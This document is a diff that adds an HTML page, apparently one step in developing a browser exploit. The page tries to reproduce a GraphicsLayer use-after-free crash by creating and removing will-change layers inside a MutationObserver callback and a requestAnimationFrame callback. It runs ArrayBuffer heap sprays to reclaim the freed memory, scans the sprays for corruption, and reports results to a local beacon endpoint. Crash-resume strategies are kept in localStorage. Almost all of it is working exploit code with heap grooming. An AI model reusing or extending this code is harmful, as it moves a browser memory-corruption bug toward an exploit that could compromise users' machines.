@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P1083 - B2 Repro + Spray</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px}
+#log{background:#12121a;border:1px solid #2a2a3a;border-radius:6px;padding:8px;margin:6px 0;
+max-height:60vh;overflow-y:auto;font-size:11px;white-space:pre-wrap;word-break:break-all}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}.hit{color:#ff00ff;font-weight:bold}
+</style>
+</head>
+<body>
+<h2 style="color:#00ff88;font-size:14px">P1083 B2 Repro + Spray</h2>
+<div id="log"></div>
+<div id="sandbox" style="position:absolute;left:-9999px;top:-9999px;width:800px;height:600px;overflow:hidden"></div>
+
+<script>
+'use strict';
+var L=document.getElementById('log'),sandbox=document.getElementById('sandbox'),T0=Date.now();
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m=String(d||'');log('info','[B] P1083-'+t+' | '+m);
+try{var u='/beacon.php?tag=P1083-'+encodeURIComponent(t);if(m)u+='&data='+encodeURIComponent(m.slice(0,900));
+u+='&t='+Date.now();new Image().src=u;}catch(e){}}
+window.onerror=function(m,s,l){try{B('JSERR',m+'@'+l);}catch(e){}};
+function h8(v){return('0'+v.toString(16)).slice(-2)}
+
+/* ══════════════════════════════════════════════════════════
+   P1083: Does P1070's exact B2 trigger still crash? And can
+   a spray reclaim the freed GraphicsLayer?
+
+   P1074 (hidden arena, observer removes the ADDED node) did NOT
+   reproduce the crash (E survived 40). P1070's B2 (observer
+   CREATES a fresh will-change layer inside the mutation callback,
+   RAF removes it, 5ms cadence, 50 cycles) crashed 5/5 at 06:34.
+
+   Strategies (one per page load, crash-resume):
+     S0: exact P1070 B2, no spray — crash-confirm + cycle count
+     S1: pre-spray 200x{400,448,512,576,640} ABs, then B2
+     S2: S1 + in-RAF spray after each removal
+   After a crash the state machine advances; DONE summarizes.
+   ══════════════════════════════════════════════════════════ */
+
+var STRATS=['S0-nospray','S1-prespray','S2-prespray-raf'];
+var sec=0,res={};
+try{sec=parseInt(localStorage.getItem('p1083_sec')||'0');}catch(e){}
+try{var r=localStorage.getItem('p1083_res');if(r)res=JSON.parse(r);}catch(e){}
+if(sec>0&&sec<=STRATS.length&&!res['S'+(sec-1)]){res['S'+(sec-1)]='CRASHED';}
+function save(){try{localStorage.setItem('p1083_sec',''+sec);
+  localStorage.setItem('p1083_res',JSON.stringify(res));}catch(e){}}
+
+B('BOOT','sec='+sec+'|prev='+JSON.stringify(res).slice(0,300));
+log('ok','=== P1083 B2 repro+spray (sec='+sec+') ===');
+
+var GLSIZES=[400,448,512,576,640];
+
+function prespray(){
+  var spray=[],views=[];
+  for(var si=0;si<GLSIZES.length;si++){var sz=GLSIZES[si];
+    for(var i=0;i<200;i++){
+      var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+      v[0]=si;v[1]=i&0xFF;v[2]=(i>>8)&0xFF;
+      for(var j=3;j<sz;j++)v[j]=0x41;
+      spray.push(ab);views.push(v);
+    }}
+  log('ok','pre-sprayed '+spray.length+' ABs');
+  return {spray:spray,views:views};
+}
+
+function scanSpray(sp){
+  var corrupt=[],scanned=0;
+  for(var i=0;i<sp.views.length;i++){
+    var v=sp.views[i];if(!v)continue;scanned++;
+    for(var j=3;j<v.length;j++){
+      if(v[j]!==0x41){
+        var hex='';for(var k=0;k<Math.min(64,v.length);k++)hex+=h8(v[k]);
+        corrupt.push({idx:i,off:j,val:v[j],hex:hex});break;
+      }
+    }
+  }
+  return {corrupt:corrupt,scanned:scanned};
+}
+
+function runB2(stratIdx){
+  return new Promise(function(resolve){
+    var sp=null;
+    if(stratIdx>=1){sp=prespray();}
+
+    sandbox.innerHTML='';
+    var container=document.createElement('div');
+    container.style.cssText='position:relative;width:100px;height:100px';
+    sandbox.appendChild(container);
+    void sandbox.offsetHeight; /* force layout — P1070 did this */
+
+    var cycles=0,maxCycles=50,lastBeacon=0;
+    var obs=new MutationObserver(function(){
+      if(cycles<maxCycles){
+        var el=document.createElement('div');
+        el.style.cssText='position:absolute;transform:translateZ(0);will-change:transform;width:10px;height:10px';
+        container.appendChild(el);
+        requestAnimationFrame(function(){
+          if(el.parentNode)el.parentNode.removeChild(el);
+          if(stratIdx===2&&sp){
+            /* in-RAF spray: fill the just-freed layer slot */
+            for(var si=0;si<GLSIZES.length;si++){var sz=GLSIZES[si];
+              for(var k=0;k<10;k++){
+                var ab=new ArrayBuffer(sz),v=new Uint8Array(ab);
+                for(var j2=0;j2<sz;j2++)v[j2]=0xDD;
+                sp.spray.push(ab);sp.views.push(v);
+              }}
+          }
+        });
+      }
+    });
+    obs.observe(container,{childList:true,subtree:true});
+
+    var trigger=function(){
+      if(cycles>=maxCycles){
+        obs.disconnect();
+        /* survived — scan if we sprayed */
+        if(sp){
+          var r=scanSpray(sp);
+          B('S'+stratIdx+'-SCAN','scanned:'+r.scanned+'|corrupt:'+r.corrupt.length+
+            (r.corrupt.length?('|HIT:idx='+r.corrupt[0].idx+',off='+r.corrupt[0].off+',hex='+r.corrupt[0].hex.substring(0,48)):''));
+          if(r.corrupt.length){
+            for(var i=0;i<Math.min(r.corrupt.length,3);i++){
+              B('S'+stratIdx+'-HIT-'+i,'idx:'+r.corrupt[i].idx+'|off:'+r.corrupt[i].off+'|hex:'+r.corrupt[i].hex);
+            }
+            resolve('SURVIVED-CORRUPT:'+r.corrupt.length);
+          } else {
+            resolve('SURVIVED-CLEAN');
+          }
+        } else {
+          resolve('SURVIVED-50');
+        }
+        return;
+      }
+      var d=document.createElement('div');
+      d.textContent='trigger'+cycles;
+      container.appendChild(d);
+      cycles++;
+      if(cycles-lastBeacon>=5){B('S'+stratIdx+'-CYC','n:'+cycles);lastBeacon=cycles;}
+      setTimeout(trigger,5);
+    };
+    B('S'+stratIdx+'-START','strat:'+STRATS[stratIdx]);
+    trigger();
+  });
+}
+
+async function run(){
+  if(sec<STRATS.length){
+    var stratIdx=sec;
+    try{localStorage.setItem('p1083_sec',''+(sec+1));}catch(e){}
+    var outcome=await runB2(stratIdx);
+    res['S'+stratIdx]=outcome;sec++;save();
+    B('S'+stratIdx+'-DONE','outcome:'+outcome);
+    setTimeout(function(){location.reload(true);},400);
+    return;
+  }
+  var summary=STRATS.map(function(s,i){return s+'='+(res['S'+i]||'?');}).join(' | ');
+  B('DONE',summary);
+  log('ok','=== P1083 COMPLETE: '+summary+' ===');
+  try{localStorage.setItem('p1083_sec','0');localStorage.removeItem('p1083_res');}catch(e){}
+}
+
+run();
+
+/* auto-reload check */
+(function(){
+  var cur='P1083-b2-repro-spray';
+  setTimeout(function check(){
+    try{
+      var x=new XMLHttpRequest();
+      x.open('GET','/reload.txt?c='+Date.now(),true);
+      x.onload=function(){
+        var t=(x.responseText||'').trim();
+        if(t&&t!==cur){location.reload(true);return;}
+        setTimeout(check,3000);};
+      x.onerror=function(){setTimeout(check,5000);};
+      x.send();
+    }catch(e){setTimeout(check,5000);}
+  },4000);
+})();
+</script>
+</body>
+</html>
